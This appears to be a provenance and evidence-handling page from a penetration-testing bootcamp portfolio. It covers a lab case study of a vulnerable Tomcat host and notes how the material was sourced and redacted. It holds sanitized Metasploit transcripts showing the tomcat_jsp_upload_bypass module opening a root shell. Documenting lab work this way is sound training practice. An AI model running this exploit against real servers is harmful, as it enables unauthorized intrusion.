# Evidence provenance and handling

## Source and attribution

The source is **“LeVonta Rekall Penetration Test Report,”** a Google Doc created in August 2024 and last modified in September 2024. Its document history lists **LeVonta Lenair** as author of a final draft, and it embeds the lab screenshots described below. The report remains outside this public repository because it contains course flags, lab credentials, and hashes. The source document's “Quantum Security LLC” and “Lead Penetration Tester” labels are scenario roles, not employment or a commercial client claim. Its scope table is an unfilled course template, so it does not independently define a formal engagement boundary.

A separately recovered collection of 117 bootcamp PNGs was classified in `WORKSPACE_INVENTORY.md` and `BOOTCAMP_RECONSTRUCTION_MAP.md` (preserved outside this repository). Rekall-branded screenshots and the private subnet recur in the Rekall group. Splunk dashboards, Azure WAF, Windows policy, and MegaCorp artifacts were classified as separate work and are not attributed to this assessment. The inventory itself states that solo versus collaborative execution was **not established**.

The three published reconnaissance images were added to this repository on August 27, 2026. The original report and recovered screenshots have not been modified for this case study. The [public Tomcat image](../evidence/exploitation/tomcat-root-shell-sanitized.png) is a cropped, redacted visual derivative of an embedded report capture, not a byte-for-byte original. Its visible commands and output were checked against the source; the connection details and all content after the `pwd` output were removed. Sanitized text transcriptions follow for context.

## Tomcat shell session

**Source capture A:** An embedded screenshot in the original report shows the Metasploit exploit run. Placeholders replace the lab target and connection details. The visible output is:

```text
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOST [LAB_TARGET]
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > run
[*] Uploading payload
[*] Payload executed!
[*] Command shell session 1 opened ([LAB_CONNECTION])
```

**Source capture B:** A separate embedded screenshot shows the active-session view and shell commands. The [public visual derivative](../evidence/exploitation/tomcat-root-shell-sanitized.png) shows this portion. The flag value and lab connection details are omitted:

```text
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > sessions
Active sessions: shell java/linux
msf6 exploit(multi/http/tomcat_jsp_upload_bypass) > sessions -i 2
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/usr/local/tomcat
```

These are **curated transcriptions, not raw terminal logs**. Session 1 opens in capture A; session 2 is inspected in capture B. The artifacts do not prove the two are the same session or one uninterrupted run. The active-session view directly supports the root-shell observation; the earlier capture supports that the named module opened a command shell. The source also displays a course flag, omitted here.

## Publication limits

- The [Nmap](../evidence/reconnaissance/01-nmap-service-enumeration-sanitized.png) and [Nessus](../evidence/reconnaissance/02-nessus-critical-vulnerability-sanitized.png) images are existing sanitized portfolio copies. Private lab addresses remain visible in the Nmap copy; they are RFC 1918 lab context, not live public targets.
- The original report contains additional claims whose screenshots, labels, or severity need individual review. They are not promoted into the two featured findings.
- No manual Struts exploitation, fixed-version verification, remediation deployment, retest, or professional client engagement is claimed.
